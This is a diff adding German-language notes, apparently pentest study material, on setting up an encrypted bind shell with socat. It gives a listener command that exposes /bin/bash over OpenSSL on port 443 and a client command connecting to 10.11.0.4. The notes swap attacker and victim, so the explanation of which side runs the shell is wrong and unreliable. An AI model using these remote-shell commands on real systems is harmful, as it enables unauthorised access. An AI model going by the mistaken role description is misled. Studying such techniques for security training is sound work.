@@ -42,5 +42,14 @@ Damit #Socat die #Zertifikate akzeptiert, müssen diese in ein .pem-File verwand
 
 `cat bind_shell.key bind_shell.crt > bind_shell.pem`
 
-Um nun eine verschl
+Um nun eine verschlüsselte #BindShell zu erzeugen, wird folgender Befehl beim Angreifer verwendet:
+`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
+
+Der Angreifer wartet nun auf eine eingehende Verbindung des Opfers.
+Das Opfer baut mit folgendem Befehl eine Verbindung zum Angreifer auf:
+`socat - OPENSSL:10.11.0.4:443,verify=0`
+
+
+
+
 
